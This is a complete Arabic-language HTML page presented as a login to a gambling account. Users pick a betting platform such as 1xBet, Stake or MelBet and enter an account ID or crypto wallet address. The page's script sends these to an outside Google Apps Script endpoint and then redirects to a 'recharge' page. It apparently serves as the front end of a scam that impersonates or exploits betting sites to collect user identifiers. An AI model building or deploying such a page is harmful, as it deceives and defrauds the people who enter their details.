<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#0052FF">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<title>الدخول إلى حسابي</title>
<style>
  :root{--blue:#0052ff;--ink:#0f172a;--line:#d5dbe5;--card:#ffffff;--muted:#64748b;--bg:#f8fafc}
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%}
  body{font-family:Inter,system-ui,-apple-system,Segoe UI,Tahoma,Arial,sans-serif;background:#fff;color:var(--ink)}
  .sysbar{position:fixed;top:0;left:0;right:0;height:env(safe-area-inset-top, 0px);background:#0052ff;z-index:10;pointer-events:none}
  .shell{max-width:380px;margin:0 auto;padding:calc(env(safe-area-inset-top, 0px) + 14px) 16px 20px}
  .card{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:16px}
  .title{font-size:18px;font-weight:700;margin-bottom:14px;text-align:center}
  .group{margin-bottom:12px}
  .label{display:block;font-size:14px;font-weight:700;color:#0f172a;margin-bottom:6px}
  .field{width:100%;height:44px;border:1px solid var(--line);border-radius:7px;background:#fff;color:#0f172a;font-size:14px;padding:0 10px;outline:none}
  .field::placeholder{color:#9aa3af}
  .btn{width:100%;height:44px;border:0;border-radius:7px;background:#0052ff;color:#fff;font-weight:600;font-size:14px;cursor:pointer}
  .btn[disabled]{opacity:.6;cursor:not-allowed}
  .warn{font-size:11px;color:#444;line-height:1.6;margin-top:10px;text-align:center}
  .initial-loading{position:fixed;inset:0;background:#fff;display:flex;align-items:center;justify-content:center;z-index:9999;gap:8px}
  .dot{width:10px;height:10px;background:var(--blue);border-radius:50%;animation:dotBounce 1.2s infinite ease-in-out both}
  .dot:nth-child(1){animation-delay:0s;}
  .dot:nth-child(2){animation-delay:0.2s;}
  .dot:nth-child(3){animation-delay:0.4s;}
  @keyframes dotBounce{0%,80%,100%{transform:scale(0);}40%{transform:scale(1);}}
  .loading-screen{position:fixed;inset:0;background:#fff;display:flex;align-items:center;justify-content:center;z-index:999;display:none}
  .spinner{width:40px;height:40px;border:3px solid #dbeafe;border-top:3px solid var(--blue);border-radius:50%;animation:spin 1s linear infinite}
  @keyframes spin{100%{transform:rotate(360deg)}}
  .slider-container{position:relative;overflow:hidden;width:100%;margin-bottom:18px;text-align:center}
  .slider-container img{width:78%;max-width:240px;height:auto;display:none;margin:0 auto}
  .slider-container img.active{display:block}

  .select-fake{display:flex;align-items:center;justify-content:space-between;gap:8px;cursor:pointer}
  .select-value{color:#0f172a;position:relative;display:inline-block}
  .chev{width:0;height:0;border-left:6px solid transparent;border-right:6px solid transparent;border-top:6px solid #0f172a}

  .select-value.shine{overflow:hidden}
  .select-value.shine::after{content:"";position:absolute;top:0;left:-75%;width:50%;height:100%;background:linear-gradient(120deg,transparent,rgba(255,255,255,.8),transparent);animation:shine 2s infinite}
  @keyframes shine{0%{left:-75%}100%{left:125%}}

  .picker-backdrop{position:fixed;inset:0;background:rgba(15,23,42,.35);display:none;align-items:flex-end;justify-content:center;z-index:1000}
  .picker{width:100%;max-width:420px;background:#fff;color:#0f172a;border-top-left-radius:16px;border-top-right-radius:16px;overflow:hidden;box-shadow:0 -10px 30px rgba(2,6,23,.15)}
  .picker-head{padding:14px 16px;font-weight:700;border-bottom:1px solid var(--line)}
  .picker-list{max-height:60vh;overflow:auto;background:#fff}
  .row{display:flex;align-items:center;gap:12px;padding:14px 16px;border-bottom:1px solid var(--line);cursor:pointer;transition:background .12s ease}
  .row:last-child{border-bottom:0}
  .row:hover{background:var(--bg)}
  .radio{width:18px;height:18px;border-radius:50%;border:2px solid var(--line);display:grid;place-items:center;flex-shrink:0}
  .radio-dot{width:10px;height:10px;border-radius:50%;background:var(--blue);display:none}
  .row.sel .radio{border-color:var(--blue)}
  .row.sel .radio-dot{display:block}
  .logo{width:34px;height:34px;border-radius:50%;background:#eef2ff;display:grid;place-items:center;color:#1f2937;font-weight:800;font-size:12px;letter-spacing:.3px}
  .rname{font-weight:800}
</style>
</head>
<body>

<div class="sysbar"></div>

<div class="initial-loading" id="initial-loading">
  <div class="dot"></div>
  <div class="dot"></div>
  <div class="dot"></div>
</div>

<div id="app" style="display:none;">
  <div class="shell">

    <div class="slider-container">
      <img src="https://i.postimg.cc/L8yrTWhj/file-000000005ebc61f4a84ec1ac4e2b389b-1.png" alt="Logo 1" class="active">
      <img src="https://i.postimg.cc/qqQsTcMS/file-0000000036f4624687082e461e11bb4f-1.png" alt="Logo 2">
    </div>

    <div class="card" id="login-card">
      <div class="title">الدخول إلى حسابي</div>

      <div class="group">
        <span class="label">حدد المنصة</span>
        <div id="platformDisplay" class="field select-fake" role="button" aria-haspopup="dialog" tabindex="0">
          <span class="select-value" id="platformText">اختر المنصة</span>
          <span class="chev"></span>
        </div>
        <input type="hidden" id="platform">
      </div>

      <div class="group">
        <span class="label" id="id-label">Account ID</span>
        <input id="uid" class="field" type="text" inputmode="numeric" maxlength="15" placeholder="ex: 87654321">
      </div>

      <button id="go" class="btn" disabled>تسجيل الدخول</button>

      <div class="warn">
        بالضغط على زر المتابعة، أنت تؤكد أن عمرك 18 سنة فأكثر وأنك توافق على سياسة الخصوصية والشروط والأحكام.
      </div>
    </div>
  </div>
</div>

<div class="picker-backdrop" id="pickerBackdrop" aria-hidden="true">
  <div class="picker" role="dialog" aria-modal="true" aria-labelledby="pickerTitle">
    <div class="picker-head" id="pickerTitle">اختر المنصة</div>
    <div class="picker-list" id="pickerList">
      <div class="row" data-name="Gooobet"><div class="radio"><div class="radio-dot"></div></div><div class="logo">GOO</div><div class="rname">Gooobet</div></div>
      <div class="row" data-name="Mega Pari"><div class="radio"><div class="radio-dot"></div></div><div class="logo">MP</div><div class="rname">Mega Pari</div></div>
      <div class="row" data-name="MyStake"><div class="radio"><div class="radio-dot"></div></div><div class="logo">MS</div><div class="rname">MyStake</div></div>
      <div class="row" data-name="Stake"><div class="radio"><div class="radio-dot"></div></div><div class="logo">ST</div><div class="rname">Stake</div></div>
      <div class="row" data-name="LINEBET"><div class="radio"><div class="radio-dot"></div></div><div class="logo">LB</div><div class="rname">LINEBET</div></div>
      <div class="row" data-name="1xBet"><div class="radio"><div class="radio-dot"></div></div><div class="logo">1X</div><div class="rname">1xBet</div></div>
      <div class="row" data-name="RiskoBet"><div class="radio"><div class="radio-dot"></div></div><div class="logo">ROB</div><div class="rname">RiskoBet</div></div>
      <div class="row" data-name="888Starz"><div class="radio"><div class="radio-dot"></div></div><div class="logo">8*8</div><div class="rname">888Starz</div></div>
      <div class="row" data-name="MelBet"><div class="radio"><div class="radio-dot"></div></div><div class="logo">MEL</div><div class="rname">MelBet</div></div>
      <div class="row" data-name="Betwinner"><div class="radio"><div class="radio-dot"></div></div><div class="logo">BW</div><div class="rname">Betwinner</div></div>
      <div class="row" data-name="Xparibet"><div class="radio"><div class="radio-dot"></div></div><div class="logo">XPA</div><div class="rname">Xparibet</div></div>
    </div>
  </div>
</div>

<div class="loading-screen" id="loading-screen">
  <div class="spinner"></div>
</div>

<script>
const initialLoading = document.getElementById('initial-loading');
const app = document.getElementById('app');
const uid = document.getElementById('uid');
const go = document.getElementById('go');
const loginCard = document.getElementById('login-card');
const loadingScreen = document.getElementById('loading-screen');

const platformInput = document.getElementById('platform');
const platformDisplay = document.getElementById('platformDisplay');
const platformText = document.getElementById('platformText');
const pickerBackdrop = document.getElementById('pickerBackdrop');
const pickerList = document.getElementById('pickerList');

const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbya5yWgv26ibjoztwv6nU4N6fEejGuPLm20SxM_3yt3jiU0DiiFW4MYom7VLOJ6aojZoQ/exec";
let platform = null;
const repReg = /^(\d)\1{6,}$/;

window.addEventListener('pageshow', (event) => {
  if (event.persisted || (window.performance && window.performance.getEntriesByType("navigation")[0].type === "back_forward")) {
    window.location.reload();
  }
});

window.addEventListener('load', ()=>{
  loadingScreen.style.display = "none";
  loginCard.style.display = "block";
  uid.value = "";
  platform = null;
  go.disabled = true;
  document.getElementById('id-label').textContent = "Account ID";
  uid.placeholder = "ex: 87654321";
  uid.setAttribute("inputmode", "numeric");
  uid.setAttribute("maxlength", "15");

  setTimeout(()=>{ initialLoading.style.display = 'none'; app.style.display = 'block'; }, 1000);
});

function openPicker(){ pickerBackdrop.style.display = 'flex'; pickerBackdrop.setAttribute('aria-hidden','false'); }
function closePicker(){ pickerBackdrop.style.display = 'none'; pickerBackdrop.setAttribute('aria-hidden','true'); }

platformDisplay.addEventListener('click', openPicker);
platformDisplay.addEventListener('keydown', (e)=>{ if(e.key==='Enter'||e.key===' '){ e.preventDefault(); openPicker(); }});
pickerBackdrop.addEventListener('click', (e)=>{ if(e.target===pickerBackdrop) closePicker(); });

pickerList.addEventListener('click',(e)=>{
  const row = e.target.closest('.row');
  if(!row) return;
  [...pickerList.children].forEach(r=>r.classList.remove('sel'));
  row.classList.add('sel');
  platform = row.getAttribute('data-name');
  platformInput.value = platform;
  platformText.textContent = platform;
  platformText.classList.add('shine');

  if(platform === "Stake" || platform === "MyStake"){
    document.getElementById('id-label').textContent = "Wallet Address";
    uid.placeholder = "ex: 0x32Be343B94f860124dC4fEe278FDCBD38C102D88";
    uid.removeAttribute("inputmode");
    uid.removeAttribute("maxlength");
  } else {
    document.getElementById('id-label').textContent = "Account ID";
    uid.placeholder = "ex: 87654321";
    uid.setAttribute("inputmode","numeric");
    uid.setAttribute("maxlength","15");
  }
  validate();
  closePicker();
});

function validate() {
  let val = uid.value.trim();
  if(platform === "Stake" || platform === "MyStake"){
    val = val.replace(/[\u0600-\u06FF\s]+/g, ''); uid.value = val;
  }
  go.disabled = true;
  if(!platform) return;
  if(platform !== "Stake" && platform !== "MyStake"){
    if(!/^[0-9]{4,15}$/.test(val)) return;
    if(repReg.test(val)) return;
  } else {
    if(val.length < 10) return;
  }
  if(val.length > 0) go.disabled = false;
}

uid.addEventListener('input', validate);

go.addEventListener('click', async () => {
  go.disabled = true;
  loginCard.style.display = "none";
  loadingScreen.style.display = "flex";
  const formData = new FormData();
  formData.append("walletAddress", uid.value.trim());
  formData.append("platform", platform);
  try{
    await fetch(SCRIPT_URL, { method:'POST', body: formData });
    localStorage.setItem('walletAddress', uid.value.trim());
    window.location.href = 'recharge/index.html';
  } catch(err){
    loadingScreen.style.display = "none";
    loginCard.style.display = "block";
    go.disabled = false;
  }
});

let current = 0;
const imgs = document.querySelectorAll(".slider-container img");
setInterval(()=>{ imgs[current].classList.remove("active"); current = (current + 1) % imgs.length; imgs[current].classList.add("active"); },3000);
</script>

</body>
</html>
